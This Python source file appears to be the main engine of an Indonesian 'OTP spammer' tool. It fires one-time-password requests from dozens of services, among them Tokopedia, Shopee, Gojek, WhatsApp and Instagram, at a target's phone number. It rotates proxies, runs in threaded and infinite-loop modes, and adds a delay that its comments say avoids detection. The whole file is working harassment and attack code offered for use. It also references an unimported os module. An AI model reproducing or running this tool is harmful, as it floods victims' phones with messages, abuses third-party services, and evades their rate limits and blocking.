#!/usr/bin/env python3
# main_engine.py - 109 API + 500+ Proxy Auto-Rotate

import sys
import time
import random
import threading
import signal
from colorama import Fore, Style
from concurrent.futures import ThreadPoolExecutor, as_completed

from license import log_info, log_success, log_warning, log_error, log_input, is_admin_number
from utils import normalize
from handlers import get_all_handlers
from proxy_manager import get_proxy_manager

print_lock = threading.Lock()
stop_flag = False

# ==================== PROXY MANAGER ====================
pm = get_proxy_manager()

# ==================== API YANG BENERAN KIRIM OTP ====================
REAL_OTP_APIS = [
    'tokopedia', 'shopee', 'gojek', 'jenius', 'blibli',
    'alodokter', 'halodoc', 'oyo', 'sayurbox', 'carsome',
    'pizzahut', 'matahari', 'olx', 'indihome', 'tiktok',
    'bonusbelanja', 'bliblitiket', 'ultramilk', 'watsons',
    '99co', 'fastwork', 'beautyhaul', 'hainaya', 'sidemang',
    'ptspkemenag', 'uber', 'doordash', 'instagram', 'whatsapp',
    'flipkart', 'paytm', 'zomato'
]

def log_target(idx, total, name, status, detail=""):
    with print_lock:
        if status == "SUCCESS":
            sym, col = "+", Fore.GREEN
        elif status == "LIMITED" or status == "BLOCKED":
            sym, col = "!", Fore.YELLOW
        else:
            sym, col = "-", Fore.RED
        print(f"{col}[{sym}]{Style.RESET_ALL} ({idx}/{total}) {name}: {status}" + (f" - {detail}" if detail else ""))

def is_success_response(resp):
    if resp is None:
        return False
    
    if isinstance(resp, tuple):
        if len(resp) >= 2:
            if isinstance(resp[0], bool):
                return resp[0]
            if isinstance(resp[0], int):
                return resp[0] < 400
        return False
    
    if hasattr(resp, 'status_code'):
        return resp.status_code < 400
    
    if isinstance(resp, bool):
        return resp
    
    if isinstance(resp, dict):
        if resp.get('success') or resp.get('status') == 'success':
            return True
        if resp.get('acknowledge') == 1:
            return True
        return False
    
    return bool(resp)

def get_detail_from_response(resp):
    if resp is None:
        return "No response"
    
    if isinstance(resp, tuple):
        if len(resp) >= 3:
            return str(resp[2])[:60] if resp[2] else "OK"
        if len(resp) >= 2:
            return str(resp[1])[:60] if resp[1] else "OK"
        return "OK"
    
    if hasattr(resp, 'status_code'):
        if resp.status_code < 400:
            return "OTP sent"
        return f"({resp.status_code})"
    
    if isinstance(resp, dict):
        return str(resp.get('message', resp.get('status', 'OK')))[:60]
    
    return "OK"

def run_handler(handler_name, handler_func, phone, idx, total):
    global stop_flag
    if stop_flag:
        return False
    
    name = handler_name
    status_text = "FAIL"
    detail = ""
    success = False

    try:
        # Proxy auto-rotate
        proxy = pm.get_proxy()
        proxy_dict = pm.get_proxy_dict(proxy)
        
        # Set proxy di environment kalo perlu
        if proxy_dict:
            original_proxies = {}
            if 'http' in proxy_dict:
                original_proxies['http'] = os.environ.get('HTTP_PROXY')
                os.environ['HTTP_PROXY'] = proxy_dict['http']
            if 'https' in proxy_dict:
                original_proxies['https'] = os.environ.get('HTTPS_PROXY')
                os.environ['HTTPS_PROXY'] = proxy_dict['https']
        
        resp = handler_func(phone)
        
        # Restore proxy
        for k, v in original_proxies.items():
            if v is None:
                os.environ.pop(k.upper(), None)
            else:
                os.environ[k.upper()] = v
        
        if resp is not None:
            if isinstance(resp, tuple):
                if len(resp) >= 2:
                    code = resp[0]
                    msg = resp[1] if len(resp) > 1 else ""
                    if code and code < 400:
                        status_text = "SUCCESS"
                        detail = "OTP sent" if name in REAL_OTP_APIS else "HTTP OK"
                        success = True
                    elif code == 429:
                        status_text = "LIMITED"
                        detail = "Rate limit"
                        pm.mark_failed(proxy)
                    else:
                        detail = f"({code}) {str(msg)[:30] if msg else ''}"
                        pm.mark_failed(proxy)
                else:
                    status_text = "SUCCESS" if resp[0] else "FAIL"
                    success = True if resp[0] else False
                    if not success:
                        pm.mark_failed(proxy)
            elif hasattr(resp, 'status_code'):
                if resp.status_code < 400:
                    status_text = "SUCCESS"
                    detail = "OTP sent" if name in REAL_OTP_APIS else "HTTP OK"
                    success = True
                    pm.mark_success(proxy)
                elif resp.status_code == 429:
                    status_text = "LIMITED"
                    detail = "Rate limit"
                    pm.mark_failed(proxy)
                elif resp.status_code == 403:
                    status_text = "BLOCKED"
                    detail = "Forbidden"
                    pm.mark_failed(proxy)
                else:
                    detail = f"({resp.status_code})"
                    pm.mark_failed(proxy)
            elif isinstance(resp, bool):
                status_text = "SUCCESS" if resp else "FAIL"
                success = resp
                if not success:
                    pm.mark_failed(proxy)
            else:
                status_text = "SUCCESS" if resp else "FAIL"
                success = True if resp else False
                if not success:
                    pm.mark_failed(proxy)
        else:
            status_text = "ERROR"
            detail = "No response"
            pm.mark_failed(proxy)
            
    except Exception as e:
        status_text = "ERROR"
        detail = str(e)[:40]
        pm.mark_failed(proxy)

    log_target(idx, total, name, status_text, detail)
    return success

def run_single_round(phone, threads=1):
    global stop_flag
    stop_flag = False
    
    # Load proxies
    pm.load_proxies(force=True)
    stats = pm.get_stats()
    
    handlers = get_all_handlers()
    total = len(handlers)
    
    print()
    print(f"{Fore.CYAN}╔═══════════════════════════════════════════════════════════╗")
    print(f"{Fore.CYAN}║{Fore.WHITE}  🔥 OTP SPAMMER - 109 API + {stats['total']} PROXY{Fore.CYAN}          ║")
    print(f"{Fore.CYAN}║{Fore.DIM}  Real OTP: {len(REAL_OTP_APIS)} API | Failed: {stats['failed']}{Fore.CYAN}                 ║")
    print(f"{Fore.CYAN}╚═══════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
    print()
    
    target62 = normalize(phone)
    if not target62:
        log_error("Format nomor tidak valid!")
        return False
    
    if is_admin_number(target62):
        log_error("Nomor ADMIN tidak boleh di-spam!")
        return False
    
    success_count = 0
    
    def signal_handler(sig, frame):
        global stop_flag
        stop_flag = True
        print()
        log_warning("Menghentikan proses...")
        raise KeyboardInterrupt
    
    original_handler = signal.getsignal(signal.SIGINT)
    signal.signal(signal.SIGINT, signal_handler)
    
    try:
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = []
            idx = 0
            for name, func in handlers.items():
                if stop_flag:
                    break
                idx += 1
                futures.append(executor.submit(run_handler, name, func, target62, idx, total))
            
            for future in as_completed(futures):
                if stop_flag:
                    for f in futures:
                        f.cancel()
                    break
                try:
                    if future.result():
                        success_count += 1
                except:
                    pass
    except KeyboardInterrupt:
        pass
    finally:
        signal.signal(signal.SIGINT, original_handler)
    
    if stop_flag:
        log_warning("Proses dihentikan user!")
        log_info(f"Sukses: {success_count}/{total}")
    else:
        log_info(f"Selesai. Sukses: {success_count}/{total}")
    
    return success_count > 0

def run_infinite_loop(phone):
    global stop_flag
    stop_flag = False
    
    # Load proxies
    pm.load_proxies(force=True)
    stats = pm.get_stats()
    
    handlers = get_all_handlers()
    total = len(handlers)
    
    print()
    print(f"{Fore.CYAN}╔═══════════════════════════════════════════════════════════╗")
    print(f"{Fore.CYAN}║{Fore.WHITE}  🔥 INFINITE LOOP - 109 API + {stats['total']} PROXY{Fore.CYAN}      ║")
    print(f"{Fore.CYAN}║{Fore.DIM}  Real OTP: {len(REAL_OTP_APIS)} API | Failed: {stats['failed']}{Fore.CYAN}                 ║")
    print(f"{Fore.CYAN}╚═══════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
    print()
    
    target62 = normalize(phone)
    if not target62:
        log_error("Format nomor tidak valid!")
        return
    
    if is_admin_number(target62):
        log_error("Nomor ADMIN tidak boleh di-spam!")
        return
    
    total_success = 0
    total_fail = 0
    round_count = 0
    
    def signal_handler(sig, frame):
        global stop_flag
        stop_flag = True
        print()
        log_warning("Menghentikan proses...")
        raise KeyboardInterrupt
    
    original_handler = signal.getsignal(signal.SIGINT)
    signal.signal(signal.SIGINT, signal_handler)
    
    try:
        while True:
            if stop_flag:
                break
            round_count += 1
            log_info(f"Round {round_count} dimulai...")
            success_count = 0
            
            # Refresh proxy setiap round
            pm.load_proxies(force=True)
            stats = pm.get_stats()
            
            with ThreadPoolExecutor(max_workers=3) as executor:
                futures = []
                idx = 0
                for name, func in handlers.items():
                    if stop_flag:
                        break
                    idx += 1
                    futures.append(executor.submit(run_handler, name, func, target62, idx, total))
                
                for future in as_completed(futures):
                    if stop_flag:
                        for f in futures:
                            f.cancel()
                        break
                    try:
                        if future.result():
                            success_count += 1
                            total_success += 1
                        else:
                            total_fail += 1
                    except:
                        total_fail += 1
            
            if stop_flag:
                break
            
            log_info(f"Round {round_count} selesai. Sukses: {success_count}/{total}")
            log_info(f"Total: success={total_success} | fail={total_fail}")
            log_info(f"Proxy: {stats['total']} available | {stats['failed']} failed")
            
            # Delay 2 detik biar gak ketahuan
            time.sleep(2)
            
    except KeyboardInterrupt:
        pass
    finally:
        signal.signal(signal.SIGINT, original_handler)
    
    if stop_flag:
        log_warning("Proses dihentikan user!")
        log_info(f"Total success: {total_success} | fail: {total_fail}")

def run_custom_thread(phone, threads=5):
    global stop_flag
    stop_flag = False
    
    # Load proxies
    pm.load_proxies(force=True)
    stats = pm.get_stats()
    
    handlers = get_all_handlers()
    total = len(handlers)
    
    print()
    print(f"{Fore.CYAN}╔═══════════════════════════════════════════════════════════╗")
    print(f"{Fore.CYAN}║{Fore.WHITE}  🔥 CUSTOM THREAD - 109 API + {stats['total']} PROXY{Fore.CYAN}       ║")
    print(f"{Fore.CYAN}║{Fore.DIM}  Threads: {threads} | Real OTP: {len(REAL_OTP_APIS)} API{Fore.CYAN}            ║")
    print(f"{Fore.CYAN}╚═══════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
    print()
    
    target62 = normalize(phone)
    if not target62:
        log_error("Format nomor tidak valid!")
        return
    
    if is_admin_number(target62):
        log_error("Nomor ADMIN tidak boleh di-spam!")
        return
    
    success_count = 0
    
    def signal_handler(sig, frame):
        global stop_flag
        stop_flag = True
        print()
        log_warning("Menghentikan proses...")
        raise KeyboardInterrupt
    
    original_handler = signal.getsignal(signal.SIGINT)
    signal.signal(signal.SIGINT, signal_handler)
    
    try:
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = []
            idx = 0
            for name, func in handlers.items():
                if stop_flag:
                    break
                idx += 1
                futures.append(executor.submit(run_handler, name, func, target62, idx, total))
            
            for future in as_completed(futures):
                if stop_flag:
                    for f in futures:
                        f.cancel()
                    break
                try:
                    if future.result():
                        success_count += 1
                except:
                    pass
    except KeyboardInterrupt:
        pass
    finally:
        signal.signal(signal.SIGINT, original_handler)
    
    if stop_flag:
        log_warning("Proses dihentikan user!")
        log_info(f"Sukses: {success_count}/{total}")
    else:
        log_info(f"Selesai. Sukses: {success_count}/{total}")
